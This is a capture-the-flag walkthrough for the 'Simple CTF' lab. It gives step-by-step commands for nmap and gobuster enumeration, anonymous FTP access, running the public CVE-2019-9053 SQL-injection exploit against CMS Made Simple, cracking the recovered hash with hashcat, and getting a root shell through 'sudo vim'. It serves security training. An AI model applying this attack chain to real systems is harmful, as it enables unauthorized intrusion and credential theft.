# Simple-CTF-walkthrough
#Step 1
 - How many services are running under port 1000?
 - Run nmap -A {target IP}
    - results in: 2 ports under 1000 and 1 port over 1000
        -21/tcp   open    ftp vsftpd 3.0.3 *note-ftp-anon:Anonymous FTP login allowed
        -80/tcp   open    http    Apache httpd 2.4.18
        -2222/tcp open    ssh     Openssh 7.2p2

#Step 2
 - CLI - ftp {target}
    - ({target}:root): Anonymous
        - use: ftp> ls
        - you will see: drxr-xr-x   2 ftp   ftp 4096 Aug 17 2019 pub
    - pub is a directory
        - use: cd /pub
        - you will see: -rw-r--r--  1ftp    ftp 166 Aug 17 2019 ForMitch.txt
        - use: get ForMitch.txt
            -the file will be sent to your directory
        - use: ftp> exit to exit the ftp you signed into
    - You will be back at YOUR root
        - type ls
        - you will see: ForMitch.txt in your files
        - type cat ForMitch.txt
        - you will see: 
                Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

#Step 3
 - Open Firefox
    - Type in the {target IP} in the URL
    - you can add /robots.txt to see if there is anything else too look at 

#Step 4
- Use gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://{target IP}
        - you will have the result: /simple (Status: 301)

#Step 5
- Reopen Firefox and use the {target IP} and add /simple at the end of it in the URL
    - You will see CMS made simple, if you go to the bottom of the page, you will see version 2.2.8
    - Open another tab in firefox and look up: exploitdb
        - open google exploit Database and put CMS made simple 2.2 in the search box
        - you will not find CMS Made Simple 2.2.8, but you will find CMS Made Simple <2.2.10-SQL injection 
    - Click on the hyperlink with CMS Made Simple <2.2.10-SQL injection 
        - you will find: CVE-2019-9053
        - click the download button and recieve the file 46635.py
        - NOTE: do not download more than one file copy of 46635.py or it will not work
#Step 6
- Open your terminal and type in Python2 46635.py -u http://{target IP}/simple/
    - If it does not work you  may need to install request
        - curl -O https://bootstrap.pypa.io/pip/2.7/get-pip.py
        - python2 get-pip.py
        then:
        - python2 -m pip install --upgrade setuptools
        then:
        - python2 -m pip install termcolor

    - If you need to put the syntax in again 'python2 46635.py -u http://{targeIP}/simple/' (without the ''), please run it again. You will start to see the formation of a Salt for password, Username, Email, and a password:
        - Salt for Password found: 1dac0d92e9fa6bb2
        - Username found: mitch
        - Email found: admin@admin.com
        - Password found: 0c01f4468bd75d7a84c7eb73846e8d96

#Step 7 (use sudo su to become root, normal user doesn't seem to work)
    - hashcat your findings
        - hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
    - you will recieve 0c01f4468bd75d7a84c7eb73846e8d96:secret
    - the password is: secret

#Step 8
    - log into ssh mitch@{targetID} -p 2222 
    - password is: secret

#Step 9
    - type: ls and find user.txt
    - cat user.txt
        - Recover G00d j0b, keep up!

#Step 10
    - type: ls /home to return to home directory under Mitch's account
    - you will see two options 'mitch' and 'sunbath'

#Step 11
    - type sudo -l (-l is for list)
    - you will see (root) NOPASSWD: /usr/bin/vim
        -vim is your next answer

#Step 12
    - go to firefox and type GTFOBins in the URL
    - in the sub sections you will see: 'Vim' 'For Windows' 'Base64' 'Python' etc
        - select Vim
        - copy the vim -c ':!/bin/sh', then click on the bubble with Sudo
            - you will see (a) sudo vim -c ':!/bin/sh'
            - copy that syntax and paste it into your terminal under mitch's machine
                - this makes you root
                - next to the (#) type: whoami
                    - you will see: root
                    - type: ls /root
                    - you will see: root.txt
                        -cd /root
                        - you will see: root.txt
                        - cat root.txt
                            -W3ll d0n3. You made it!
